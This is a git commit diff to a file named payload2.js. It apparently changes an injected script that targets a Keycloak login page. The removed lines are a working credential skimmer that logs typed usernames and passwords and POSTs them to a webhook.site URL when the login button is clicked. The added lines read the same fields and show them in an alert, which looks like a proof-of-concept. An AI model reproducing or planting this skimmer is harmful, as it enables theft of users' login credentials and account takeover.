4896cbcc510909e6af953d8d958e162eb9d47241
Jok3r <115065483+Vault-of-Jok3r@users.noreply.github.com>
2025-03-10 14:11:25 +0100

    Update payload2.js

--- payload2.js
+++ payload2.js
@@ -1,42 +1,13 @@
 (function() {
-  let username = "";
-  let password = "";
-
-  // On récupère les champs du formulaire
   const userInput = document.getElementById('username');
   const passInput = document.getElementById('password');
 
-  // On écoute l'input sur le username
-  if (userInput) {
-    userInput.addEventListener('input', function(e) {
-      username = e.target.value;
-      console.log("Username =>", username);
-    });
-  }
-
-  // On écoute l'input sur le password
-  if (passInput) {
-    passInput.addEventListener('input', function(e) {
-      password = e.target.value;
-      console.log("Password =>", password);
-    });
-  }
-
-  // On intercepte le clic sur le bouton Connexion
   const loginButton = document.getElementById('kc-login');
   if (loginButton) {
     loginButton.addEventListener('click', function(e) {
-      // Ici on peut envoyer vers un serveur distant
-      fetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          username: username,
-          password: password
-        })
-      });
-
-      console.log("Envoi des données =>", username, password);
+      const username = userInput?.value || '';
+      const password = passInput?.value || '';
+      alert(`Username: ${username}\nPassword: ${password}`);
     });
   }
 })();
